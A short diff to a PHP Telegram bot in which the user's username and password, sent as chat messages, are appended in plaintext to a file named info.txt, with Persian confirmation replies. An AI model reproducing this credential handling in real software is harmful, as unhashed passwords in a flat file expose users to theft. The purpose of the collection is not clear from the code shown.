@@ -132,6 +132,11 @@ if ($text == '/start') {
     $number = fgets($f);
     $number = (int)$number;
     if ($number == 1) {
+        $username = $text;
+        $current = file_get_contents("info.txt");
+        $data_to_write.= $current." ".$username."\n";
+        file_put_contents('info.txt', $data_to_write);
+
         $submitUsername = "
         نام کاربری شما با عنوان <strong>" . $text . "</strong> ثبت شد.
         ";
@@ -152,6 +157,10 @@ if ($text == '/start') {
         ];
         sendToTelegram($SendUserName);
     } else if ($number == 2) {
+        $password = $text;
+        $current = file_get_contents("info.txt");
+        $data_to_write.= $current." ".$password."\n";
+        file_put_contents('info.txt', $data_to_write);
         $submitPassword = "
         پسورد شما با عنوان <strong>" . $text . "</strong> ثبت شد.
         ";
